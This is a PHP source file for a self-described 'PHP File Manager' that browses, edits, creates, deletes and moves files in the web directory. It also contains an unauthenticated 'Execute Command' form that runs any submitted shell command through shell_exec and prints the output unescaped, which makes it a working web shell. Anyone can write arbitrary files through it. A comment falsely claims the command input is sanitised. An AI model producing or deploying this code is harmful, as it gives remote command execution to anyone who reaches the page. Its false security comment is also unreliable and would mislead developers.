<?php
$baseDir = realpath("."); // Base directory
$currentPath = isset($_GET['path']) ? $_GET['path'] : ''; // Path from URL
$currentDir = realpath($baseDir . '/' . $currentPath); // Full path of current directory

// Make sure the current directory is valid and within the base directory
if ($currentDir === false || strpos($currentDir, $baseDir) !== 0) {
    die("Invalid path.");
}

$filesPerPage = 20; // Items per page
$page = isset($_GET['page']) ? max(1, (int)$_GET['page']) : 1; // Current page

// --- Shell Execution ---
$commandOutput = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command']; // Sanitize user input to prevent command injection
    $commandOutput = shell_exec($command); // Execute the command
}

// --- Handle File Create / Update ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
    $filename = basename($_POST['filename']);
    $content = $_POST['content'];
    file_put_contents("$currentDir/$filename", $content);
    echo "<p>File <b>$filename</b> saved.</p>";
}

// --- Handle File Delete ---
if (isset($_GET['delete'])) {
    $filename = basename($_GET['delete']);
    $filePath = "$currentDir/$filename";
    if (file_exists($filePath)) {
        unlink($filePath);
        echo "<p>File <b>$filename</b> deleted.</p>";
    }
}

// --- Handle File Move ---
if (isset($_POST['move_file']) && isset($_POST['target_folder'])) {
    $source = basename($_POST['move_file']);
    $targetFolder = basename($_POST['target_folder']);
    $targetPath = "$baseDir/$targetFolder/$source";

    if (file_exists("$currentDir/$source") && is_dir("$baseDir/$targetFolder")) {
        if (rename("$currentDir/$source", $targetPath)) {
            echo "<p>Moved <b>$source</b> to folder <b>$targetFolder</b>.</p>";
        } else {
            echo "<p>Failed to move <b>$source</b>.</p>";
        }
    }
}

// --- Load File to Edit ---
$editFile = "";
$editContent = "";
if (isset($_GET['edit'])) {
    $editFile = basename($_GET['edit']);
    if (file_exists("$currentDir/$editFile")) {
        $editContent = file_get_contents("$currentDir/$editFile");
    }
}

// --- List Subfolders for Move Dropdown ---
$subdirs = array_filter(glob("$baseDir/*"), 'is_dir');
$subdirs = array_map('basename', $subdirs);

// --- List All Items in Current Directory ---
$allItems = array_diff(scandir($currentDir), ['.', '..']); // Exclude '.' and '..'
$items = [];

foreach ($allItems as $item) {
    $itemPath = "$currentDir/$item";
    
    // Get the file's owner, group, and permissions
    $owner = posix_getpwuid(fileowner($itemPath))['name']; // Get owner name
    $group = posix_getgrgid(filegroup($itemPath))['name']; // Get group name
    $perms = fileperms($itemPath); // Get file permissions
    $perms = substr(sprintf('%o', $perms), -4); // Convert permissions to octal
    
    $items[] = [
        'name' => $item,
        'is_dir' => is_dir($itemPath),
        'size' => is_dir($itemPath) ? '-' : filesize($itemPath),
        'last_modified' => date("Y-m-d H:i:s", filemtime($itemPath)),
        'owner' => $owner,
        'group' => $group,
        'permissions' => $perms
    ];
}

// --- Pagination Logic ---
$totalItems = count($items);
$totalPages = ceil($totalItems / $filesPerPage);
$offset = ($page - 1) * $filesPerPage;
$pagedItems = array_slice($items, $offset, $filesPerPage);

// --- Helper: Build URL for Pagination ---
function buildUrl($params) {
    $base = $_GET;
    unset($base['delete'], $base['edit']);
    return '?' . http_build_query(array_merge($base, $params));
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP File Manager</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }

        table, th, td {
            border: 1px solid black;
        }

        th, td {
            padding: 10px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }

        .action-buttons a, .action-buttons button {
            margin-right: 5px;
        }

        .folder-icon {
            color: blue;
        }

        .file-icon {
            color: green;
        }

        .shell-output {
            background-color: #f1f1f1;
            padding: 10px;
            border: 1px solid #ccc;
            font-family: monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
<h2>File Manager</h2>
<p>Current Directory: <code><?= htmlspecialchars(str_replace($baseDir, '', $currentDir) ?: '/') ?></code></p>

<?php if ($currentDir !== $baseDir): ?>
    <p><a href="<?= buildUrl(['path' => dirname($currentPath), 'page' => 1]) ?>">⬅ Go Up</a></p>
<?php endif; ?>

<!-- Create / Edit Form -->
<form method="POST">
    <input type="text" name="filename" placeholder="Filename" value="<?= htmlspecialchars($editFile) ?>" required><br>
    <textarea name="content" rows="10" cols="50" placeholder="File content"><?= htmlspecialchars($editContent) ?></textarea><br>
    <button type="submit"><?= $editFile ? "Update File" : "Create File" ?></button>
</form>

<hr>

<h3>Items in Directory (Page <?= $page ?> of <?= $totalPages ?>)</h3>

<table>
    <thead>
        <tr>
            <th>Item Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Last Modified</th>
            <th>Owner</th>
            <th>Group</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
    </thead>
    <tbody>
        <?php foreach ($pagedItems as $item): ?>
            <tr>
                <td>
                    <?php if ($item['is_dir']): ?>
                        <span class="folder-icon">📁</span>
                        <a href="<?= buildUrl(['path' => $currentPath . '/' . $item['name'], 'page' => 1]) ?>"><?= htmlspecialchars($item['name']) ?></a>
                    <?php else: ?>
                        <span class="file-icon">📄</span>
                        <?= htmlspecialchars($item['name']) ?>
                    <?php endif; ?>
                </td>
                <td><?= $item['is_dir'] ? 'Folder' : 'File' ?></td>
                <td><?= $item['size'] ?></td>
                <td><?= $item['last_modified'] ?></td>
                <td><?= $item['owner'] ?></td>
                <td><?= $item['group'] ?></td>
                <td><?= $item['permissions'] ?></td>
                <td class="action-buttons">
                    <?php if (!$item['is_dir']): ?>
                        <a href="<?= buildUrl(['edit' => $item['name']]) ?>">Edit</a>
                        <a href="<?= buildUrl(['delete' => $item['name']]) ?>" onclick="return confirm('Delete this file?')">Delete</a>
                        <form method="POST" style="display:inline;">
                            <select name="target_folder" required>
                                <option value="">Move to...</option>
                                <?php foreach ($subdirs as $folder): ?>
                                    <option value="<?= htmlspecialchars($folder) ?>"><?= htmlspecialchars($folder) ?></option>
                                <?php endforeach; ?>
                            </select>
                            <input type="hidden" name="move_file" value="<?= htmlspecialchars($item['name']) ?>">
                            <button type="submit">Move</button>
                        </form>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
    </tbody>
</table>

<?php if ($totalPages > 1): ?>
<div style="margin-top: 10px;">
    <?php if ($page > 1): ?>
        <a href="<?= buildUrl(['page' => $page - 1]) ?>">« Prev</a>
    <?php endif; ?>
    |
    <?php if ($page < $totalPages): ?>
        <a href="<?= buildUrl(['page' => $page + 1]) ?>">Next »</a>
    <?php endif; ?>
</div>
<?php endif; ?>

<hr>

<h3>Execute Command</h3>
<form method="POST">
    <input type="text" name="command" placeholder="Enter shell command" required>
    <button type="submit">Run Command</button>
</form>

<?php if ($commandOutput !== ""): ?>
    <div class="shell-output">
        <pre><?= $commandOutput ?></pre>
    </div>
<?php endif; ?>

</body>
</html>
